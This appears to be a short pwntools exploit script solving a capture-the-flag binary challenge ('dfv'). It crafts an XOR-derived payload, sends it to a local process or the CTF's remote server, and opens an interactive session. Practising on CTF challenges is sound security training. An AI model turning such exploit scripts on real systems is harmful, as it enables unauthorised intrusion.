#!/usr/bin/env python2
from pwn import *
from binascii import unhexlify

context.terminal = ["alacritty", "-e", "sh", "-c"]

BINARY = "./dfv"
HOST, PORT = "pwn.ctf.b01lers.com", 1001

GDB_SETUP = """
set follow-fork-mode child

c
"""

if "--live" not in sys.argv:
    p = process(BINARY)
    if "--debug" in sys.argv:
        gdb.attach(p, GDB_SETUP)
else:
    p = remote(HOST, PORT)

# *input ^ *(input + 8) must equal 0x1004d5d649dc0f00
# The target value is 0x1004d5d649dc0f00.
# >>> hex(0x1004d5d649dc0f00 ^ 0x4141414141414141)
# '0x51459497089d4e41'
payload = 'AAAAAAAA' + p64(0x1004d5d649dc0f00 ^ 0x4141414141414141)

p.sendline(payload)

p.interactive()
